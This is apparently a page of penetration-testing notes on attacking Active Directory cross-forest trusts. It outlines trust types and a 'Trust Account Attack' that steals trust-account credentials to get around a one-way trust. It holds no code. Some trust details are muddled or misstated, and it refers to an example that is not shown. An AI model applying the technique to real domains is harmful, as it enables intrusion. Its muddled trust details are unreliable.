# Cross Forest Attacks

In **Active Directory (AD)**, a **trust** is a connection between the authentication systems of two domains, allowing users from one domain to access resources in another. Trusts exist both **within a single AD forest** and **between separate forests (cross-forest trusts).** There are many ways to attack cross-forest trusts.

{% hint style="info" %}
**Types of Cross-Forest Trusts**

1. **External Trust**: Connects 2 separate domains in different hosts, that do not have a forest trust, and uses SID filtering to prevent SID History abuse.
2. **Forest Trust**: Connects 2 entire entire AD forest allowing users from one forest to authenticate across all domains in the other forest. If **Domain A trusts Forest X**, then **any user from Forest X** can access **any domain in Forest A**.

#### **In a nutshell**

* AD **trusts** allow users in different domains/forests to access resources.
* **External Trusts** are **more restrictive** and use **SID Filtering**.
* **Forest Trusts** are **more flexible but riskier** because they allow **full authentication across forests**.
* **One-Way Trusts** allow access in only **one direction**, while **Two-Way Trusts** allow access in **both directions**.
* Attackers can **abuse trust relationships** if security is not properly configured.

### <mark style="color:yellow;">Trust Account Attack</mark>

In above example we see a one-way trust from Forest A to Forest B, the access works from A to B but not the other way around. To brake this rule we can perform a Trust Account Attack. &#x20;

{% hint style="info" %}
When a trust is created, a **trust account (A$) is automatically created in Forest-B**. This account is just a **regular domain user** in Forest-B. Attackers in **Forest-A** can **steal the credentials** of this trust then login to **Forest-B** bypassing one-way restriction.
